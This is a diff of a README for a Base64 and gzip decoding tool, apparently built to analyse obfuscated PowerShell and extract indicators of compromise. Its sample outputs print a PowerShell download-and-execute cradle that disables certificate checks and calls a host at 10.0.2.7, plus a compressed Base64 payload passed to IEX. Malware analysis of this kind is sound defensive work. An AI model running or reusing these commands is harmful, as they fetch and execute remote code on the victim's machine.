@@ -2,24 +2,24 @@
 
 # Sample
 - Decode Base64 for Input String
-```
+```bash
 > deco.py -d <base64>
 ```
 
 - Decode Base64 for Read File
-```
+```bash
 > deco.py -f sample.txt
 [+] Output Base64 Decoded
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('https://10.0.2.7:443/utag/lbg/main/prod/_bs')
 ```
 
 - Decode Base64 for Read File And Output File
-```
+```bash
 > deco.py -f sample.txt -o sample_deco.txt
 ```
 
 - Decode Base64 for Read File And Extract IoC
-```
+```bash
 > deco.py -f sample.txt -i
 [+] Print IoC
 url -> https://10.0.2.7:443/utag/lbg/main/prod/_bs
@@ -30,9 +30,12 @@ ipv4addr -> 10.0.2.7
 ```
 
 - Decode Base64 And Ungzip
-```
+```bash
 > deco.py -f sample2.txt
 IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('H4sIACyQmV0C/51WW1PiSBR+z6/oSuWBzEAAUcaR4gEDrqyiLKBTu5a11SQHaAndme7OKMPy3/d0Ei46Os4uT/Tpcz9ffyd3w6XSsPCuQHtDkN9YAH3BuO5RTqcg709OjBSkD1KzCQuohlsasZBqJrhPo2hMgzlpkpWjZQJry1FB055pHauTcrla8Sregffp5PCwZuPV6zdlGirgCspaimQcgZoJoUGWq/VatYbXtjVJeGDiEb/VIwVnDsui0711V5aWS4xMMf4VPJauxw8QaGLnJQ0hSCTTS8+Xy1iLqaTxbOkN2AMPKURZgaFtrQkWFcz+q58WqOy86ZoU31gI0sYeUK8nQkBvdz914bN4BtKoYpv9U98Y9mkYMj591zbXy43/AimUMT+NRDAfsu8mePXg2IguYJkLDo7qFptgA7F31mrz15uCHi1jKLjeFV0AKcFXLF1L9G6jGnro3u6l4wuOcNAY9EyKxSlVUD/MtFO/awsiBTszlK2tdRYL57aNi//fD4yp/2Jk43ovdGZopCa4Q9c7CHWu/A2EEo4QcsZ7IUbwpL0OD4TpLQa6GZ0de7+BPl1qUAVjYKUoMTg0PizH9BUD+hLwZaBlOiNZQL2JuQFvJClXEyEXZ4zTKJ1PwRkXSaVInLF3CXyqZ651N8YId/f3xIkzh9i8j8SZWD8WPxLPS49da6+8dmdbHvDgZX0/a6FRt5xsaOO7iudVj+6fV2uGaTnhfsVt2Ks4MTfhmxVX63slkxKeXeu9xm+SS9y9GlFe+gLjIGLANVbrCzFn4JJVllzB3LcxOVI6wywovuQwLPd65SX+bLeRad0hhYFmC/N8+lQq6DzRQBecsLivXXR4EkXGZv62jV05RkIrH1Sqn+3XrTPIk1KksUGYKDwxjbhMFEhuoN8kNvJjTJV6FDLcHKV4WiYyyo+PwXN62iNubIafNqNhWc6sidppQGwy5SEpIEYUjl1h7zRFgvX8y8FtdvZ69EFIUppqcuC6mBmG8c6BIpEprxWGBftcKI2FzPLnxSbo110hzUsW65M9SnfMxbtc3thaBi9MDXG+DH6DDSq1plgZNrYnvrMoouUjr0IKXxgPxaMiVyNidkmDoKB+2CBP9UOXtOI4AmzKBdPlo9onr1YnhYvzUe+ySCI2BwRQMBcu8Wf4CKD8qY67qHZc+exVKxUypBMqWW6GPPRDTgOYgESeL9p4m/Z5M6gUgY/xz8bUN6o7i2K6NTcA2cIhHdsWDqnb/nBoXmL2fkeilG4FyJ7HTpWUWqofUcbNe0rhHwBiF4k2kBAq9MAxM5FlprLMFukiXGCPPZposUg3u9cf4gMPUchoRLaZFU0eDVOkt7s2brchGrhPDU7IipjO4QDbMKFJpF/om7obJBt52hQjfIxRlJtb75vvjF9mg/I9ickpbXCwIQrycqp3e2M6R1QO4GsCSmcqZjunlkXcT6DMu+m2mznt2G5WBdkjqFgiR0hTQ5C8tsn7OLWAxTTychh301T1EiMhefmJlHg2lPoGmt72tBVgtYnZVtNfSuA0YZHu8oGIDLe1wgXjTGlJkdkzbOLEuypTKKBTFykAoqb9wV6bcWUHfMH4QbZykmYa3DOI+Yg3+RfWKnUE/NvJDuhm5TuZMBCLONHZhevY7ir3nDSf2ayx26Jpb2UhIpbxhpM0fvCSSfqDa78zHF4P/m4N/PPuqOOPbgadhhOzsPH6h2r2VRnHTVyJpGQW31H/Nvzz6oI+/HHTH3fbnD9cfr/tHtX++r1e6bJq+/SgfXlz0apfPk2bpJRw4ojdZyU6sjuDwfXAMFwOjXxL7bZYKUMTPuXY9XAiPBJIpfn2UzhIA4QQ/lc+pow8cE5YuIkMD9of0NkH29B+/A9h8GS+ltLqM+1tDWtrqKnUpWEEEJNapfILWvU3tf4FXLhUFXQMAAA='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
+```
+
+```bash
 > deco.py -d H4sIACyQmV0C/51WW1PiSBR+z6/oSuWBzEAAUcaR4gEDrqyiLKBTu5a11SQHaAndme7OKMPy3/d0Ei46Os4uT/Tpcz9ffyd3w6XSsPCuQHtDkN9YAH3BuO5RTqcg709OjBSkD1KzCQuohlsasZBqJrhPo2hMgzlpkpWjZQJry1FB055pHauTcrla8Sregffp5PCwZuPV6zdlGirgCspaimQcgZoJoUGWq/VatYbXtjVJeGDiEb/VIwVnDsui0711V5aWS4xMMf4VPJauxw8QaGLnJQ0hSCTTS8+Xy1iLqaTxbOkN2AMPKURZgaFtrQkWFcz+q58WqOy86ZoU31gI0sYeUK8nQkBvdz914bN4BtKoYpv9U98Y9mkYMj591zbXy43/AimUMT+NRDAfsu8mePXg2IguYJkLDo7qFptgA7F31mrz15uCHi1jKLjeFV0AKcFXLF1L9G6jGnro3u6l4wuOcNAY9EyKxSlVUD/MtFO/awsiBTszlK2tdRYL57aNi//fD4yp/2Jk43ovdGZopCa4Q9c7CHWu/A2EEo4QcsZ7IUbwpL0OD4TpLQa6GZ0de7+BPl1qUAVjYKUoMTg0PizH9BUD+hLwZaBlOiNZQL2JuQFvJClXEyEXZ4zTKJ1PwRkXSaVInLF3CXyqZ651N8YId/f3xIkzh9i8j8SZWD8WPxLPS49da6+8dmdbHvDgZX0/a6FRt5xsaOO7iudVj+6fV2uGaTnhfsVt2Ks4MTfhmxVX63slkxKeXeu9xm+SS9y9GlFe+gLjIGLANVbrCzFn4JJVllzB3LcxOVI6wywovuQwLPd65SX+bLeRad0hhYFmC/N8+lQq6DzRQBecsLivXXR4EkXGZv62jV05RkIrH1Sqn+3XrTPIk1KksUGYKDwxjbhMFEhuoN8kNvJjTJV6FDLcHKV4WiYyyo+PwXN62iNubIafNqNhWc6sidppQGwy5SEpIEYUjl1h7zRFgvX8y8FtdvZ69EFIUppqcuC6mBmG8c6BIpEprxWGBftcKI2FzPLnxSbo110hzUsW65M9SnfMxbtc3thaBi9MDXG+DH6DDSq1plgZNrYnvrMoouUjr0IKXxgPxaMiVyNidkmDoKB+2CBP9UOXtOI4AmzKBdPlo9onr1YnhYvzUe+ySCI2BwRQMBcu8Wf4CKD8qY67qHZc+exVKxUypBMqWW6GPPRDTgOYgESeL9p4m/Z5M6gUgY/xz8bUN6o7i2K6NTcA2cIhHdsWDqnb/nBoXmL2fkeilG4FyJ7HTpWUWqofUcbNe0rhHwBiF4k2kBAq9MAxM5FlprLMFukiXGCPPZposUg3u9cf4gMPUchoRLaZFU0eDVOkt7s2brchGrhPDU7IipjO4QDbMKFJpF/om7obJBt52hQjfIxRlJtb75vvjF9mg/I9ickpbXCwIQrycqp3e2M6R1QO4GsCSmcqZjunlkXcT6DMu+m2mznt2G5WBdkjqFgiR0hTQ5C8tsn7OLWAxTTychh301T1EiMhefmJlHg2lPoGmt72tBVgtYnZVtNfSuA0YZHu8oGIDLe1wgXjTGlJkdkzbOLEuypTKKBTFykAoqb9wV6bcWUHfMH4QbZykmYa3DOI+Yg3+RfWKnUE/NvJDuhm5TuZMBCLONHZhevY7ir3nDSf2ayx26Jpb2UhIpbxhpM0fvCSSfqDa78zHF4P/m4N/PPuqOOPbgadhhOzsPH6h2r2VRnHTVyJpGQW31H/Nvzz6oI+/HHTH3fbnD9cfr/tHtX++r1e6bJq+/SgfXlz0apfPk2bpJRw4ojdZyU6sjuDwfXAMFwOjXxL7bZYKUMTPuXY9XAiPBJIpfn2UzhIA4QQ/lc+pow8cE5YuIkMD9of0NkH29B+/A9h8GS+ltLqM+1tDWtrqKnUpWEEEJNapfILWvU3tf4FXLhUFXQMAAA= -g -o sample.gzip
 > $sc="https://10.0.2.7:443"
 $s="https://10.0.2.7:443/adsense/troubleshooter/1631343/"
